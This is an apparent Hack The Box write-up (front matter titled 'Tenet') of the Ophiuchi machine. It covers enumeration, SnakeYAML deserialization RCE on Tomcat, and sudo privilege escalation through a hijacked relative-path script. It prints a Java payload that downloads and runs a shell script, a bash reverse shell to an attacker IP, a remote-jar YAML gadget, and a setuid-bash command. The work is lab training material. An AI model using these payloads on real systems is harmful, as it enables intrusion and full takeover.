---
layout: post
title: Tenet
published: true
---

**Ophiuchi is a medium machine from Hack The Box.**

### Enumeration

First things first:
```
nmap -sC -sV -v -p- -oN nmap 10.10.10.227
```

The only available services are SSH over 22 and an Apache Tomcat server on port 8080.
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The homepage of the webserver contains a field meant for parsing YAML syntax. I tried to access the Tomcat admin panels but I don't have any credentials so that's probably a dead end for the time being.

I did some poking around the parser and managed to pop a 500 error:
![Pasted image 20210630161559](https://user-images.githubusercontent.com/60187707/124597858-946b0880-de29-11eb-80b3-fb49df616b2d.png)

### Exploitation

Now I have some specifics about the back end. I started looking for SnakeYAML exploits and came across [this article](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858).
There is a deserialization vulnerability in certain SnakeYAML libraries that can lead to RCE.
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Management%20Interface/README.md) also has a good walkthrough of the exploit, and is the one that I used.

Before crafting a payload, I verified the PoC by making sure the web server would reach out to my own web server if prompted and indeed it does:

![Pasted image 20210630162027](https://user-images.githubusercontent.com/60187707/124598623-70f48d80-de2a-11eb-8a4c-cc6a4f40602e.png)

It took a bit to build the payload and necessary file structure, and then a **bit** longer to find a payload that would actually result in a reverse shell.

First, I edited `AwesomeScriptEngineFactory.java` to include my payload, which, in this case, was downloading a reverse shell from my machine to the target's `/tmp` folder, and then executing it.
```
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("wget http://10.10.14.22/shell.sh -O /tmp/shell.sh");
	    	    Runtime.getRuntime().exec("bash /tmp/shell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

`shell.sh`:
```
#!/bin/sh
bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Next step was to create a YAML config file pointing to a jar file on my server:
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.22/yaml-payload.jar"]
  ]]
]
```
Then, convert the `.java` file to a class file:
`javac src/artsploit/AwesomeScriptEngineFactory.java`

And build the jar file:
`jar -cvf yaml-payload.jar -C src/ .`

With that all prepped, and a web server spun up, I only needed to paste the proper YAML code into the parser and receive the incoming connection.

![Pasted image 20210701090406](https://user-images.githubusercontent.com/60187707/124600619-82d73000-de2c-11eb-86cb-1f0375a938f3.png)

Tomcat grabbing my shell:

![Pasted image 20210701090740](https://user-images.githubusercontent.com/60187707/124600655-8a96d480-de2c-11eb-8ccf-ab3fbb2c8631.png)

And on the target as `tomcat`:

![Pasted image 20210701090844](https://user-images.githubusercontent.com/60187707/124600706-9f736800-de2c-11eb-86dd-8cde0163d6b4.png)

### Privilege Escalation

Having seen Apache Tomcat a few times before, I knew there were some configuration files that could have credentials, so I went looking.

Looked in `/opt/tomcat/conf/tomcat-users.xml` and found:

`<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>`

I found credentials as a user, `admin`, and used them to login over SSH.

Next step, as always, is checking sudo privileges:

![Pasted image 20210630175218](https://user-images.githubusercontent.com/60187707/124601329-540d8980-de2d-11eb-82fd-9a1138cb4c00.png)

The `admin` user is limited to running a specific Go script.

![Pasted image 20210701092957](https://user-images.githubusercontent.com/60187707/124601623-ad75b880-de2d-11eb-8487-05e4e86d91d7.png)

Looking closely at `index.go`, it seems to read something out of `main.wasm` and if that returns something other than 1, it prints "Not ready to deploy". 
If it returns anything else, however, it will then call `deploy.sh`, which is not an absolute path, and that could enable me to hijack the execution of the script.
`deploy.sh` only contains 2 commented-out lines so it's not doing anything, even if it does get called. Let's fix that.

Next step is finding out what `main.wasm` does.
Download the file to my machine, and clone the [WebAssembly Binary Toolkit](https://github.com/WebAssembly/wabt) to take a closer look.
I used `wasm2wat` to convert `main.wasm` to the human-readable `.wat` format:

```
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

It's a mercifully short file and `i32.const 0` looks like a relevant line for my purposes.

I did [some research](https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format) into WebAssembly and what `i32.const` is used for, and I should be able to just change the 0 to a 1 to hijack the execution flow.

So I did just that:

![Pasted image 20210630184209](https://user-images.githubusercontent.com/60187707/124603706-d434ee80-de2f-11eb-992b-aceb44d20f03.png)

Convert `main.wat` back to `main.wasm` with `wat2wasm`.
Create a malicious `deploy.sh` to place in `/tmp`, where I'll execute the Go script:
```
#!/bin/bash
chmod +s /bin/bash
```

Grab `main.wasm` from my web server and place it in `/tmp`, execute the sudo command, and drop into a new shell:

![Pasted image 20210701100311](https://user-images.githubusercontent.com/60187707/124604033-24ac4c00-de30-11eb-96b4-dc4caaf3185c.png)

Rooted!

















